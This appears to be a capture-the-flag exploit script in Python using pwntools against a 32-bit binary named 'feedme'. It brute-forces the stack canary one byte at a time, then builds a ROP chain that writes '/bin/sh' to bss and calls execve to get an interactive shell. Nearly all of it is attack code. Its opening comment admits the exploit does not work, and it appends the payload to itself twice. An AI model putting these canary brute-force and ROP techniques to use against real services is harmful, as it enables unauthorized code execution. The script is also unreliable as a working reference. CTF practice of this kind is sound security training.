#!/usr/bin/python
# exploit does not work fix later
from pwn import *
# stack canary is at 32 bytes and
# the return address is at 48 bytes from the input
# Use ROP to bind together instructions to get a shell
# This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
def append_shellcode(payload):
	payload += p32(0x080bb496)    # pop eax ; ret
	payload += p32(0x80eb928)    # bss address
	payload += p32(0x0806f34a)    # pop edx
	payload += p32(0x6e69622f)    # /bin string in hex, in little endian
	payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret
	# Write the second half of the string '/bin/sh' the '/sh' to 0x80eb928 + 0x4
	payload += p32(0x080bb496)    # pop eax ; ret
	payload += p32(0x80eb928 + 0x4)    # bss address + 0x4 to write after '/bin'
	payload += p32(0x0806f34a)    # pop edx
	payload += p32(0x0068732f)    # /sh string in hex, in little endian
	payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret
	# Now that we have the string '/bin/sh' written to 0x80eb928, we can load the appropriate values into the eax, ecx, edx, and ebx registers and make the syscall.
	payload += p32(0x080bb496)    # pop eax ; ret
	payload += p32(0xb)            # 11
	payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
	payload += p32(0x0)            # 0x0
	payload += p32(0x80eb928)    # bss address
	payload += p32(0x0806f34a)    # pop edx ; ret
	payload += p32(0x0)            # 0x0
	payload += p32(0x8049761)    # syscall
	return payload
# stack canary is 3 random bytes which we can bruteforce
# followed by a null-byte
def guessCanary(target):
    # We know that the first byte of the stack canary has to be \x00 since it is null terminated, keep the values we know for the canary in known_canary
    known_canary = "\x00"
    # Ascii representation of the canary
    hex_canary = "00"
    # The current canary which will be incremented
    canary = 0x0
    # The number of bytes we will give as input
    inp_bytes = 0x22
    # Iterate 3 times for the three bytes we need to brute force
    for j in range(0, 3):
        # Iterate up to 0xff times to brute force all posible values for byte
        for i in range(0xff):
            log.info("Trying canary: " + hex(canary) + hex_canary)
            # Send the current input size
            target.send(p32(inp_bytes)[0])
            # Send this iterations canary
            target.send("0"*0x20 + known_canary + p32(canary)[0])
            # Scan in the output, determine if we have a correct value
            output = target.recvuntil("exit.")
            if "YUM" in output:
                # If we have a correct value, record the canary value, reset the canary value, and move on
                print "next byte is: " + hex(canary)
                known_canary = known_canary + p32(canary)[0]
                inp_bytes = inp_bytes + 1
                new_canary = hex(canary)
                new_canary = new_canary.replace("0x", "")
                hex_canary = new_canary + hex_canary
                canary = 0x0
                break
            else:
                # If this isn't the canary value, increment canary by one and move onto next loop
                canary = canary + 0x1
    # Return the canary
    return int(hex_canary, 16)
if __name__=='__main__':
	target = process('./feedme')
	# Brute force the canary
	canary = guessCanary(target)
	log.info("The canary is: " + hex(canary))
	# fill the buffer and replace the canary with 
	# its original value
	payload = "a"*32 + p32(canary)
	payload += "a"*12
	payload += append_shellcode(payload)
	target.send("\x78") # number of bytes to allocate for payload
	target.send(payload)
	target.interactive()
